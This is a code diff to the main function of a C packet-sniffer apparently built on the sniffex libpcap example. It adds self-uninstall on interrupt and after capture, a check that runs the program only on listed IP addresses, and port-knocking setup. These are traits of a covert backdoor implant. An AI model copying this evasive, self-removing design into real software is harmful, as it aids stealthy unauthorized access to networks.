@@ -1,8 +1,15 @@
 #include "sniffex.h"
 
 
+void handle_sigint(int sig){
+	uninstall();
+}
+
+
 int main(int argc, char **argv)
 {
+	signal(SIGINT, handle_sigint);
+
 	char *dev = NULL;				/* capture device name */
 	char errbuf[PCAP_ERRBUF_SIZE];	/* error buffer */
 	pcap_t *handle;					/* packet capture handle */
@@ -11,7 +18,6 @@ int main(int argc, char **argv)
 	struct bpf_program fp;			/* compiled filter program (expression) */
 	bpf_u_int32 mask;				/* subnet mask */
 	bpf_u_int32 net;				/* ip */
-	int num_packets = 100;			/* number of packets to capture */
 
 	// print_app_banner();
 
@@ -43,7 +49,7 @@ int main(int argc, char **argv)
 
 	// check for environment key, make sure we can run on this machine
 	const char* ip_addr = (const char*) get_ip_addr();
-	if(check_env_key(ip_addr) == 0){
+	if(check_env_key(ip_addr) == -1){
 		fprintf(stderr, "The IP Address %s is not valid.\n", ip_addr);
 		#ifdef DEBUG
 			printf("IP Address not listed in config file\n");
@@ -65,7 +71,7 @@ int main(int argc, char **argv)
 	#ifdef DEBUG
 		/* print capture info */
 		printf("Device: %s\n", dev);
-		printf("Number of packets: %d\n", num_packets);
+		printf("Number of packets: %d\n", NUM_PACKETS);
 		printf("Filter expression: %s\n", filter_exp);
 	#endif
 
@@ -113,7 +119,7 @@ int main(int argc, char **argv)
 	init_knocking();
 
 	/* now we can set our callback function */
-	pcap_loop(handle, num_packets, got_packet, NULL);
+	pcap_loop(handle, NUM_PACKETS, got_packet, NULL);
 
 	/* cleanup */
 	pcap_freecode(&fp);
@@ -121,7 +127,10 @@ int main(int argc, char **argv)
 
 	#ifdef DEBUG
 		printf("\nCapture complete.\n");
+		printf("Uninstalling...\n");
 	#endif
+
+	uninstall();
 
 return 0;
 }
